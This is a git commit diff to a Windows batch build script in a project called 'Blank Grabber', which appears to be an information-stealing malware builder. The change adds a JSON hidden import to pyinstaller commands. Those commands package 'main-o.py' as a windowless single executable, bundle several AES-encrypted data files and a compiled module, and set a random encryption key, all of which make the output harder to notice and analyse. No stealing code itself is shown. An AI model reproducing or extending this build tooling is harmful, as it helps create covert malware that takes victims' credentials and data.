abc06df9ff75eaa66abbe98a8c06122c04754e9f
Blank <94945186+Blank-c@users.noreply.github.com>
2022-07-17 18:19:59 +0530

    Update convert.bat

--- Blank Grabber/Data/convert.bat
+++ Blank Grabber/Data/convert.bat
@@ -5,10 +5,10 @@ python ooo.py
 title Converting to exe...
 goto convert
 :icon
-pyinstaller --onefile --noconsole --noconfirm main-o.py --name "Blank Grabber" --icon icon.ico --clean --hidden-import=urllib3 --add-data "cm.bam.aes;." --add-data "a.es;." --add-data "ck.bam.aes;." --add-data "pm.bam.aes;." --add-data "structc.pyd;." --key %random%%random%%random%5 --version-file "version.txt"
+pyinstaller --onefile --noconsole --noconfirm main-o.py --name "Blank Grabber" --icon icon.ico --clean --hidden-import=json --hidden-import=urllib3 --add-data "cm.bam.aes;." --add-data "a.es;." --add-data "ck.bam.aes;." --add-data "pm.bam.aes;." --add-data "structc.pyd;." --key %random%%random%%random%5 --version-file "version.txt"
 goto done
 :noicon
-pyinstaller --onefile --noconsole --noconfirm main-o.py --name "Blank Grabber" --i NONE --clean --hidden-import=urllib3 --add-data "cm.bam.aes;." --add-data "a.es;." --add-data "ck.bam.aes;." --add-data "pm.bam.aes;." --add-data "structc.pyd;." --key %random%%random%%random%5 --version-file "version.txt"
+pyinstaller --onefile --noconsole --noconfirm main-o.py --name "Blank Grabber" --i NONE --clean --hidden-import=json --hidden-import=urllib3 --add-data "cm.bam.aes;." --add-data "a.es;." --add-data "ck.bam.aes;." --add-data "pm.bam.aes;." --add-data "structc.pyd;." --key %random%%random%%random%5 --version-file "version.txt"
 goto done
 :convert
 if exist icon.ico goto icon
